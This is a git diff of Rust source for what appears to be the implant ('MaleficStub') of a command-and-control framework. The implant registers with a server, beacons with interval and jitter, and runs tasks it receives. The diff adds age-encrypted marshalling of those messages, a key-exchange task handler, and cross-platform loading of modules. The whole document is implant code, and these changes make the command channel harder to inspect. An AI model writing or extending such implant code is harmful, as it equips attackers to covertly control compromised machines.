@@ -16,7 +16,7 @@ use malefic_core::transport::{Client, InnterTransport};
 use malefic_core::{check_body, config};
 use malefic_helper::debug;
 use malefic_proto::proto::{modulepb, implantpb, implantpb::{Spite, Spites}, implantpb::spite::Body};
-use malefic_proto::{marshal, new_error_spite, new_spite};
+use malefic_proto::{marshal, new_empty_spite, new_error_spite, new_spite};
 
 
 
@@ -50,6 +50,26 @@ impl MaleficStub {
         let sysinfo = malefic_core::common::sys::get_register_info();
         debug!("sysinfo: {:#?}", sysinfo);
 
+        let secure = {
+            #[cfg(feature = "secure")]
+            {
+                if let Some(public_key) = self.meta.get_encrypt_key(){
+                    Some(modulepb::Secure {
+                        enable: true,
+                        key: String::new(), // 预留加密密钥字段
+                        r#type: "age".to_string(),
+                        public_key: public_key.to_string(),
+                    })
+                } else {
+                    None
+                }
+            }
+            #[cfg(not(feature = "secure"))]
+            {
+                None
+            }
+        };
+
         new_spite(
             0,
             "register".to_string(),
@@ -63,6 +83,7 @@ impl MaleficStub {
                     interval: config::INTERVAL.clone(),
                     jitter: config::JITTER.clone() as f64,
                 }),
+                secure,
             }),
         )
     }
@@ -93,11 +114,15 @@ impl MaleficStub {
                 println!("length: {}", spites.spites.len());
             }
         }
-        let marshaled = marshal(self.meta.get_uuid(), spites.clone())?;
+        // Marshal with optional encryption
+        let marshaled = marshal(self.meta.get_uuid(), spites.clone(), self.meta.get_encrypt_key())?;
+        
         if let Ok(res) = client.handler(transport, marshaled).await {
             match res {
                 Some(spite_data) => {
-                    let spites = spite_data.parse()?;
+                    // Parse with optional decryption
+                    let private_key = self.meta.get_decrypt_key();
+                    let spites = spite_data.parse(private_key)?;
                     self.handler(spites).await?;
                 }
                 None => {
@@ -186,7 +211,6 @@ impl MaleficStub {
                 );
                 self.push(result).await?;
             }
-            #[cfg(target_os = "windows")]
             Ok(InternalModule::LoadModule) => {
                 let modules = self.manager.load_module(req.clone())?;
                 self.push(new_spite(
@@ -197,10 +221,6 @@ impl MaleficStub {
                     }),
                 ))
                 .await?;
-            }
-            #[cfg(not(target_os = "windows"))]
-            Ok(InternalModule::LoadModule) => {
-                return Err(anyhow::anyhow!("LoadModule is only supported on Windows"));
             }
             Ok(InternalModule::LoadAddon) => {
                 self.manager.load_addon(req.clone())?;
@@ -303,6 +323,11 @@ impl MaleficStub {
                 ))
                 .await?
             }
+            Ok(InternalModule::KeyExchange) => {
+                let key_request = check_body!(req, Body::KeyExchangeRequest)?;
+                let key_resp = self.handle_key_exchange(req.task_id, key_request).await?;
+                self.push(key_resp).await?;
+            }
             Err(_) => {
                 let body = req.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                 let module = self
@@ -316,5 +341,30 @@ impl MaleficStub {
             }
         };
         Ok(())
+    }
+
+    async fn handle_key_exchange(&mut self, task_id: u32, key_request: modulepb::KeyExchangeRequest) -> anyhow::Result<Spite> {
+        #[cfg(feature = "secure")]
+        {
+            let (private_key, public_key)  = malefic_proto::generate_age_keypair();
+
+            // 如果request中包含server的公钥，保存到meta
+            if !key_request.public_key.is_empty() {
+                self.meta.server_public_key = key_request.public_key;
+            }
+
+            self.meta.private_key = private_key;
+            Ok(new_spite(
+                task_id,
+                "key_exchange".to_string(),
+                Body::KeyExchangeResponse(modulepb::KeyExchangeResponse {
+                    public_key,
+                }),
+            ))
+        }
+        #[cfg(not(feature = "secure"))]
+        {
+            Ok(new_empty_spite(task_id, "key_ack".to_string()))
+        }
     }
 }
